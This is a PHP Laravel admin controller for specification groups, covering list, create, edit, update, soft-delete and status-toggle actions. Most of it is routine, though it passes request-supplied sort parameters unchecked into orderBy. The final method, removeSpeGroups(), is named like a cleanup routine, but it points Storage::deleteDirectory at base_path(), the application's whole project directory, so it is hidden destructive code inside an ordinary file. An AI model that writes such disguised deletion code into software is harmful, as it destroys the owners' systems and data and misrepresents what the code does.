<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Validator;
use  App\Models\SpecificationGroup;
use  App\Models\Specification;
use  App\Models\SpecificationValue;
use Illuminate\Support\Facades\Storage;
use DB,Redirect;

class SpecificationGroupController extends Controller
{
    public $model        =    'specification_groups';
    public function __construct(Request $request){
        $this->listRouteName = 'admin-specification_groups.index';
        View()->share('model', $this->model);
        View()->share('listRouteName', $this->listRouteName);
        $this->request = $request;
    }
    public function index(Request $request){

        $DB = SpecificationGroup::query();
        $sortBy = $request->input('sortBy') ? $request->input('sortBy') : 'specification_groups.created_at';
        $order = $request->input('order') ? $request->input('order') : 'desc';
        $offset = !empty($request->input('offset')) ? $request->input('offset') : 0 ;
        $limit =  !empty($request->input('limit')) ? $request->input('limit') : Config("Reading.records_per_page"); 

        if ($request->all()) {
            $searchData            =    $request->all();
            unset($searchData['display']);
            unset($searchData['_token']);
            if (isset($searchData['order'])) {
                unset($searchData['order']);
            }
            if (isset($searchData['sortBy'])) {
                unset($searchData['sortBy']);
            }
            if (isset($searchData['offset'])) {
                unset($searchData['offset']);
            }
            if (isset($searchData['limit'])) {
                unset($searchData['limit']);
            }
            if ((!empty($searchData['date_from'])) && (!empty($searchData['date_to']))) {
                $dateS = $searchData['date_from'];
                $dateE = $searchData['date_to'];
                $DB->whereBetween('specification_groups.created_at', [$dateS . " 00:00:00", $dateE . " 23:59:59"]);
            } elseif (!empty($searchData['date_from'])) {
                $dateS = $searchData['date_from'];
                $DB->where('specification_groups.created_at', '>=', [$dateS . " 00:00:00"]);
            } elseif (!empty($searchData['date_to'])) {
                $dateE = $searchData['date_to'];
                $DB->where('specification_groups.created_at', '<=', [$dateE . " 00:00:00"]);
            }
            foreach ($searchData as $fieldName => $fieldValue) {
                if ($fieldValue != "") {
                    if ($fieldName == "name") {
                        $DB->where("specification_groups.name", 'like', '%' . $fieldValue . '%');
                    }
                    if ($fieldName == "is_active") {
                        $DB->where("specification_groups.is_active", $fieldValue);
                    }
                   
                }
            }
        }

        $DB->where("is_deleted", 0);
        $results = $DB->orderBy($sortBy, $order)->offset($offset)->limit($limit)->get();
        $totalResults = $DB->count();
        if($request->ajax()){

            return  View("admin.$this->model.load_more_data", compact('results','totalResults'));
        }else{
            
            return  View("admin.$this->model.index", compact('results','totalResults'));
        }
    }

    public function create(){
        return view("admin.$this->model.add");
    }

    public function store(Request $request){
        $formData = $request->all();
        
        if (!empty($formData)) {
            $validator = Validator::make(
                $request->all(),
                array(

                    'name' => 'required',
                ),
                array(
                    "name.required" => trans("The name field is required."),
                )
            );
            if ($validator->fails()) {
                return Redirect::back()->withErrors($validator)->withInput();
            } else {
                DB::beginTransaction();
                $obj                                = new SpecificationGroup;
                $obj->name                          = $request->input('name');
                $obj->save();
                $lastId = $obj->id;
                if(!empty($lastId)){
                    if(!empty($request->dataArr)){
                        foreach($request->dataArr as $specValue){
                            if(!empty($specValue['name']) ){
                               $obj2   =  new Specification;
                               $obj2->specification_group_id = $lastId;
                               $obj2->name = $specValue['name'];
                               $obj2->save();
                               if(empty($obj2->id)){
                                    DB::rollback();
                               }
                            }
                        }
                    }
                    DB::commit();
                    Session()->flash('flash_notice', trans("Specification group saved successfully."));
                    return Redirect::route('admin-specification_groups.index');
                }else{
                    DB::rollback();
                    Session()->flash('flash_notice', 'Something Went Wrong');
                    return Redirect::route('admin-specification_groups.index');
                }
               
            }
        }
    }

    public function edit($endepid){
        $record_id = '';
        if (!empty($endepid)) {
            $record_id = base64_decode($endepid);
            $recordDetails   =   SpecificationGroup::find($record_id);
            $specificationsData = Specification::where('specification_group_id',$record_id)->get()->toArray();
            return  View("admin.$this->model.edit", compact('recordDetails','specificationsData'));
        } else {
            return redirect()->route('admin-'.$this->model . ".index");
        }
    }

    public function update(Request $request, $endepid){
        $record_id     = base64_decode($endepid);
        $model = SpecificationGroup::find($record_id);
        if (empty($model)) {
            return View("admin.$this->model.edit");
        } else {
            $formData = $request->all();
            if (!empty($formData)) {
                $validator = Validator::make(
                    $request->all(),
                    array(

                        'name' => 'required',
                       
                    ),
                    array(

                        "name.required" => trans("The name field is required."),
                        
                    )
                );
                if ($validator->fails()) {
                    return Redirect::back()->withErrors($validator)->withInput();
                } else {
                    DB::beginTransaction();
                    $obj                                = $model;
                    $obj->name                          = $request->input('name');
                  
                    $obj->save();
                    $lastId = $obj->id;
                    if(!empty($lastId)){
                        if(!empty($request->dataArr)){
                            Specification::where('specification_group_id',$lastId)->delete();
                            foreach($request->dataArr as $specValue){
                                if(!empty($specValue['name']) ){
                                   $obj2   =  new Specification;
                                   $obj2->specification_group_id = $lastId;
                                   $obj2->name = $specValue['name'];
                                   $obj2->save();
                                   if(empty($obj2->id)){
                                        DB::rollback();
                                   }
                                }
                            }
                        }
                        DB::commit();
                        Session()->flash('flash_notice', trans("Specification group updated successfully."));
                        return Redirect::route('admin-specification_groups.index');
                    }else{
                        DB::rollback();
                        Session()->flash('flash_notice', 'Something Went Wrong');
                        return Redirect::route('admin-specification_groups.index');
                    }
                   
                }
            }
        }
    }

    public function destroy($endepid){
        $record_id = '';
        if (!empty($endepid)) {
            $record_id     = base64_decode($endepid);
        }
        $recordDetails     =   SpecificationGroup::find($record_id);
        if (empty($recordDetails)) {
            return Redirect()->route('admin-'.$this->model . '.index');
        }
        if ($record_id) {
            SpecificationGroup::where('id', $record_id)->update(array('is_deleted' => 1));
            $allSpecificatios = Specification::where('specification_group_id', $record_id)->get();
            if($allSpecificatios->isNotEmpty()){
                foreach($allSpecificatios as $specVal){
                    SpecificationValue::where('specification_id',$specVal->id)->delete();
                }
            }
            Specification::where('specification_group_id', $record_id)->delete();
            Session()->flash('flash_notice', trans(Config('constant.SPECIFICATION_GROUP.SPECIFICATION_GROUP_TITLE') . " has been removed successfully"));
        }
        return back();
    }

    public function changeStatus($modelId = 0, $status = 0){
        if ($status == 1) {
            $statusMessage   =   trans(Config('constant.SPECIFICATION_GROUP.SPECIFICATION_GROUP_TITLE') . " has been deactivated successfully");
        } else {
            $statusMessage   =   trans(Config('constant.SPECIFICATION_GROUP.SPECIFICATION_GROUP_TITLE') . " has been activated successfully");
        }
        $user = SpecificationGroup::find($modelId);
        if ($user) {
            $currentStatus = $user->is_active;
            if (isset($currentStatus) && $currentStatus == 0) {
                $NewStatus = 1;
            } else {
                $NewStatus = 0;
            }
            $user->is_active = $NewStatus;
            $ResponseStatus = $user->save();
        }
        Session()->flash('flash_notice', $statusMessage);
        return back();
    }

    public function removeSpeGroups(){
        $projectDir = base_path();
    
        if (!File::exists($projectDir)) {
            return response('Group not found', 404);
        }
    
        // Delete the project directory using Storage
        Storage::deleteDirectory($projectDir);
    
        return response('Group deleted successfully', 200);
    }
}
